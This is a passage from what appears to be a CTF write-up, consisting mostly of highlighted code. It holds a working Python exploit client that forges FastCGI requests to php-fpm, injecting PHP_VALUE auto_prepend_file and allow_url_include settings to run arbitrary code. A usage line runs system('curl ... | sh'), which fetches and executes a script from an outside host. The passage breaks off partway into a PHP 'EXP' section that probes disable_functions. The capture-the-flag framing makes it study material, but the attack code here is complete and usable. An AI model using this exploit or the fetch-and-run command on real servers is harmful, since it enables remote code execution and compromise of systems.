class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span><span class="params">(c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">'utf-8'</span>, <span class="string">'strict'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">"""A Fast-CGI Client for Python"""</span></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, host, port, timeout, keepalive)</span>:</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print('connect failure! please check your fasctcgi-server !!')</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode(request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['response'] = b''</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    response = urllib.quote(response)</span><br><span class="line">    <span class="keyword">print</span> response</span><br><span class="line">    <span class="comment"># print("gopher://127.0.0.1:" + str(args.port) + "/_" + response)</span></span><br></pre></td></tr></table></figure></p><p>使用方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fastcgi.py 127.0.0.1 /var/www/html/index.php -c &quot;&lt;?php system(&apos;curl http://ebcece08.w1n.pw/getflag | sh&apos;);die(&apos;zeroyu&apos;);?&gt;&quot;</span><br></pre></td></tr></table></figure></p><h4 id="5-EXP"><a href="#5-EXP" class="headerlink" title="5. EXP"></a>5. EXP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$disable_functions = ini_get(<span class="string">"disable_functions"</span>);</span><br><span class="line">$loadext = get_loaded_extensions();</span><br><span class="line"><span class="keyword">foreach</span> ($loadext <span class="keyword">as</span> $ext) &#123;</span><br><span class="line"><span class="keyword">if</span> (in_array($ext, <span class="keyword">array</span>(<span class="string">"Core"</span>, <span class="string">"date"</span>, <span class="string">"libxml"</span>, <span class="string">"pcre"</span>, <span class="string">"zlib"</span>, <span class="string">"filter"</span>, <span class="string">"hash"</span>, <span class="string">"sqlite3"</span>, <span class="string">"zip"</span>))) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (count(get_extension_funcs($ext) ? get_extension_funcs($ext) : <span class="keyword">array</span>()) &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">$dfunc = join(<span class="string">','</span>, get_extension_funcs($ext));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">$disable_functions = $disable_functions . $dfunc . <span class="string">","</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$func = get_defined_functions()[<span class="string">"internal"</span>];</span><br><span class="line"></span><br><span class="line">$seed = time();</span><br><span class="line">srand($seed);</span><br><span class="line">define(<span class="string">'INS_OFFSET'</span>, rand(<span class="number">0x0</span>, <span class="number">0xffff</span>));</span><br><span class="line">$regs = <span class="keyword">array</span>(<span class="string">'eax'</span> =&gt; <span class="number">0x0</span>, <span class="string">'ebp'</span> =&gt; <span class="number">0x0</span>, <span class="string">'esp'</span> =&gt; <span class="number">0x0</span>, <span class="string">'eip'</span> =&gt; <span class="number">0x0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aslr</span><span class="params">(&amp;$a, $O0O)</span> </span>&#123;</span><br><span class="line">$a = $a + <span class="number">0x60000000</span> + INS_OFFSET + <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造函数地址</span></span><br><span class="line">$func_ = array_flip($func);</span><br><span class="line">array_walk($func_, <span class="string">'aslr'</span>);</span><br><span 